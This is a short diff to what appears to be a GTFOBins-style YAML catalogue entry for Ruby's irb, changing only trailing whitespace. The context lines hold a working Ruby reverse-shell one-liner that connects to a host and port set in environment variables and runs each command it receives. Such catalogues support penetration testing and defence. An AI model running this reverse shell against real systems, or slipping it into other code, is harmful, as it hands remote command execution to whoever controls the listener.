@@ -9,7 +9,7 @@ functions:
       code: |
         export RHOST='127.0.0.1'
         export RPORT=9000
-        irb 
+        irb
         require 'socket'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end
   file-upload:
     - description: Serve files in the local folder running an HTTP server on port 8080.
